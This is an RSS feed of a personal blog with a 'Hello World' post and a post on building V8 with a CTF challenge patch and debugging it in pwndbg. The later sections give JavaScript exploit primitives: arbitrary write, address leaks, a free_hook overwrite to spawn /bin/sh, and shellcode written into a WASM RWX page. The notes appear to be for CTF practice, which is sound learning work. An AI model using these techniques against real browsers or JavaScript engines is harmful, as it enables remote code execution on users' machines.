<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Anemone&#39;s Blog</title>
        <link>https://vergissmeinnichtz.github.io/posts/</link>
        <description>Recent content in Posts on Anemone&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sun, 07 Feb 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://vergissmeinnichtz.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Hello World</title>
            <link>https://vergissmeinnichtz.github.io/posts/helloworld/</link>
            <pubDate>Sun, 07 Feb 2021 00:00:00 +0000</pubDate>
            
            <guid>https://vergissmeinnichtz.github.io/posts/helloworld/</guid>
            <description>Hello World Hope I can keep my dream.</description>
            <content type="html"><![CDATA[<h2 id="hello-world">Hello World</h2>
<p>Hope I can keep my dream.</p>
]]></content>
        </item>
        
        <item>
            <title>How to Build V8</title>
            <link>https://vergissmeinnichtz.github.io/posts/build-v8/</link>
            <pubDate>Sun, 07 Feb 2021 00:00:00 +0000</pubDate>
            
            <guid>https://vergissmeinnichtz.github.io/posts/build-v8/</guid>
            <description>Install depot_tools git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git vim /etc/profile Add `export PATH=$PATH:&amp;#34;/path/to/depot_tools&amp;#34;` to `.profile` cd /depot_tools &amp;amp;&amp;amp; ./gclient Install ninja git clone https://github.com/ninja-build/ninja.git cd ninja &amp;amp;&amp;amp; ./configure.py --bootstrap &amp;amp;&amp;amp; cd .. vim /etc/profile Add `export PATH=$PATH:&amp;#34;/path/to/ninja&amp;#34;` to `.profile` source /etc/profile Download the source code of V8 fetch v8 Patch and compile the debug version cd v8 # git checkout 8.6.358 git reset --hard +hash gclient sync #apply patch git apply &amp;lt; &amp;#34;path/to/tctf.diff&amp;#34; tools/dev/v8gen.</description>
            <content type="html"><![CDATA[<h2 id="install-depot_tools">Install depot_tools</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
vim /etc/profile
Add <span style="color:#e6db74">`</span>export PATH<span style="color:#f92672">=</span>$PATH:<span style="color:#e6db74">&#34;/path/to/depot_tools&#34;</span><span style="color:#e6db74">`</span> to <span style="color:#e6db74">`</span>.profile<span style="color:#e6db74">`</span>
cd /depot_tools <span style="color:#f92672">&amp;&amp;</span> ./gclient
</code></pre></div><h2 id="install-ninja">Install ninja</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/ninja-build/ninja.git
cd ninja <span style="color:#f92672">&amp;&amp;</span> ./configure.py --bootstrap <span style="color:#f92672">&amp;&amp;</span> cd ..
vim /etc/profile
Add <span style="color:#e6db74">`</span>export PATH<span style="color:#f92672">=</span>$PATH:<span style="color:#e6db74">&#34;/path/to/ninja&#34;</span><span style="color:#e6db74">`</span> to <span style="color:#e6db74">`</span>.profile<span style="color:#e6db74">`</span>
source /etc/profile
</code></pre></div><h2 id="download-the-source-code-of-v8">Download the source code of V8</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">fetch v8
</code></pre></div><h2 id="patch-and-compile-the-debug-version">Patch and compile the debug version</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd v8
<span style="color:#75715e"># git checkout 8.6.358</span>
git reset --hard +hash
gclient sync

<span style="color:#75715e">#apply patch</span>
git apply &lt; <span style="color:#e6db74">&#34;path/to/tctf.diff&#34;</span>

tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug
<span style="color:#75715e">#the result is in /out.gn/x64.debug/d8</span>
<span style="color:#75715e">#./tools/dev/gm.py x64.debug</span>
</code></pre></div><h2 id="patch-and-compile-the-release-version">Patch and compile the release version</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release
<span style="color:#75715e">#the result is in /out.gn/x64.release/d8</span>
<span style="color:#75715e"># ./tools/dev/gm.py x64.release</span>
</code></pre></div><h2 id="add-gdb-support">Add gdb support</h2>
<p>Add to <code>~/.gdbinit</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source /path/to/v8/tools/gdbinit
source /path/to/v8/tools/gdb-v8-support.py
</code></pre></div><h2 id="gdb-init">Gdb init</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb ./d8
pwndbg&gt; set args --allow-natives-syntax ./exp.js
pwndbg&gt; r
</code></pre></div><h2 id="command-job">Command job</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; job 0x2a46080c2b95
0x2a46080c2b95: <span style="color:#f92672">[</span>JSArray<span style="color:#f92672">]</span>
 - map: 0x2a4608201869 &lt;Map<span style="color:#f92672">(</span>PACKED_SMI_ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
 - prototype: 0x2a46081c8515 &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
 - elements: 0x2a46081ce7bd &lt;FixedArray<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>PACKED_SMI_ELEMENTS <span style="color:#f92672">(</span>COW<span style="color:#f92672">)]</span>
 - length: <span style="color:#ae81ff">3</span>
 - properties: 0x2a46080406e9 &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
    0x2a4608042629: <span style="color:#f92672">[</span>String<span style="color:#f92672">]</span> in ReadOnlySpace: <span style="color:#75715e">#length: 0x2a4608140165 &lt;AccessorInfo&gt; (const accessor descriptor)</span>
 <span style="color:#f92672">}</span>
 - elements: 0x2a46081ce7bd &lt;FixedArray<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
           0: <span style="color:#ae81ff">1</span>
           1: <span style="color:#ae81ff">2</span>
           2: <span style="color:#ae81ff">3</span>
 <span style="color:#f92672">}</span>
</code></pre></div><h2 id="command-telescope">Command telescope</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; telescope 0x2a46080c2b95
00:0000│   0x2a46080c2b95 ◂— 0xbd080406e9082018
01:0008│   0x2a46080c2b9d ◂— 0x3d00000006081ce7
02:0010│   0x2a46080c2ba5 ◂— 0x9a0000000608040a
03:0018│   0x2a46080c2bad ◂— 0x9a3ff19999999999
04:0020│   0x2a46080c2bb5 ◂— 0x6640019999999999
05:0028│   0x2a46080c2bbd ◂— 0x9400a6666666666 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;fffff\n@\t&#39;</span><span style="color:#f92672">)</span>
06:0030│   0x2a46080c2bc5 ◂— 0xa5080406e9082019
07:0038│   0x2a46080c2bcd ◂— 0xb100000006080c2b
</code></pre></div><h2 id="debug">Debug</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%DebugPrint<span style="color:#f92672">(</span>a<span style="color:#f92672">)</span>;
%SystemBreak<span style="color:#f92672">()</span>;
</code></pre></div><h2 id="arbitrary-write">Arbitrary write</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">data_buf</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf_backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addressOf</span>(<span style="color:#a6e22e">data_buf</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write64_dataview</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">data</span>)
{
    <span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">buf_backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
    <span style="color:#a6e22e">data_view</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">data</span>), <span style="color:#66d9ef">true</span>);
    <span style="color:#75715e">//%SystemBreak();
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+]write to : &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">data</span>));
}
</code></pre></div><h2 id="get-the-address-in-d8">Get the address in d8</h2>
<p>Array obj -&gt; map -&gt; constructor -&gt; code -&gt; d8 addr</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">2.2</span>, <span style="color:#ae81ff">3.3</span>];
<span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">a</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">addressOf</span>(<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">constructor</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span><span style="color:#a6e22e">n</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">leak_d8_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">code_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x41</span><span style="color:#a6e22e">n</span>);<span style="color:#a6e22e">ß</span>
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] find leak_d8_addr: 0x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">leak_d8_addr</span>));
<span style="color:#f92672">%</span><span style="color:#a6e22e">SystemBreak</span>();
</code></pre></div><h2 id="edti-free_hook-to-system-and-getshell">Edti free_hook to system and getshell</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_shell</span>()
{
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">get_shell_buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x1000</span>);
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">get_shell_dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">get_shell_buffer</span>);
    <span style="color:#a6e22e">get_shell_dataview</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#ae81ff">0x0068732f6e69622f</span><span style="color:#a6e22e">n</span>)); <span style="color:#75715e">///bin/sh\x00 
</span><span style="color:#75715e"></span>}
</code></pre></div><h2 id="use-wasm-to-execute-shellcode">Use WASM to execute shellcode</h2>
<h3 id="init">Init</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmCode</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">11</span>]);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmModule</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasmCode</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmInstance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">wasmModule</span>, {});
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasmInstance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addressOf</span>(<span style="color:#a6e22e">f</span>);
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] leak wasm func addr: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">f_addr</span>));
<span style="color:#f92672">%</span><span style="color:#a6e22e">SystemBreak</span>();
</code></pre></div><h3 id="looking-for-rwx_page_addr">Looking for rwx_page_addr</h3>
<p>Function&ndash;&gt;shared_info&ndash;&gt;WasmExportedFunctionData&ndash;&gt;instance-&gt;instance+0x88</p>
<h4 id="without-compression-pointer">Without compression pointer</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">//function_addr-&gt;shared_info_addr-&gt;WasmExportedFunctionData-&gt;instance_addr-&gt;rwx_addr
</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shared_info_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">f_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span><span style="color:#a6e22e">n</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_exported_func_data_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">shared_info_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span><span style="color:#a6e22e">n</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">wasm_exported_func_data_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span><span style="color:#a6e22e">n</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rwx_page_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x88</span><span style="color:#a6e22e">n</span>);

<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+]leak rwx_page_addr: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rwx_page_addr</span>));
</code></pre></div><h4 id="with-compression-pointer">With compression pointer</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">//function_addr-&gt;shared_info_addr-&gt;WasmExportedFunctionData-&gt;instance_addr-&gt;rwx_addr
</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shared_info_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak32_l</span>(<span style="color:#a6e22e">f_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_exported_func_data_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak32_l</span>(<span style="color:#a6e22e">shared_info_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak32_l</span>(<span style="color:#a6e22e">wasm_exported_func_data_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rwx_page_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak64</span>(<span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x68</span>);

<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+]leak rwx_page_addr: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rwx_page_addr</span>));
</code></pre></div><h3 id="write-shellcode-and-execute-it">Write shellcode and execute it</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">/* /bin/sh for linux x64
</span><span style="color:#75715e"> char shellcode[] = &#34;\x6a\x3b\x58\x99\x52\x48\xbb\x2f \x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&#34;;
</span><span style="color:#75715e">*/</span>
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> [
    <span style="color:#ae81ff">0x2fbb485299583b6a</span><span style="color:#a6e22e">n</span>,
    <span style="color:#ae81ff">0x5368732f6e69622f</span><span style="color:#a6e22e">n</span>,
    <span style="color:#ae81ff">0x050f5e5457525f54</span><span style="color:#a6e22e">n</span>
];

<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">24</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">data_buf</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf_backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addressOf</span>(<span style="color:#a6e22e">data_buf</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;

<span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">buf_backing_store_addr</span>, <span style="color:#a6e22e">rwx_page_addr</span>); 
<span style="color:#a6e22e">data_view</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">shellcode</span>[<span style="color:#ae81ff">0</span>]), <span style="color:#66d9ef">true</span>);
<span style="color:#a6e22e">data_view</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">8</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">shellcode</span>[<span style="color:#ae81ff">1</span>]), <span style="color:#66d9ef">true</span>);
<span style="color:#a6e22e">data_view</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">16</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">shellcode</span>[<span style="color:#ae81ff">2</span>]), <span style="color:#66d9ef">true</span>);

<span style="color:#a6e22e">f</span>();
</code></pre></div>]]></content>
        </item>
        
    </channel>
</rss>
